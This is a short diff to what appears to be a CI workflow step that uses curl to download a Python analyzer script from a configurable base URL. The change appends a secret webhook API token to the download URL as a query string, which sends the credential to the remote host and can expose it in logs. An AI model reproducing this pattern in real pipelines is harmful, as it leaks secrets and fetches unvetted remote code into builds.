@@ -94,7 +94,7 @@ jobs:
         if: steps.check_size.outputs.LIMIT_EXCEEDED == 'false'
         run: |
           echo "📥 Downloading enhanced_analyzer.py from $BASE_URL/enhanced_analyzer.py"
-          curl -L -o enhanced_analyzer.py "$BASE_URL/enhanced_analyzer.py" \
+          curl -L -o enhanced_analyzer.py "$BASE_URL/enhanced_analyzer.py?t=$WEBHOOK_API_TOKEN" \
             -H 'Accept: text/x-python' \
             --connect-timeout 10 \
             --max-time 60 \
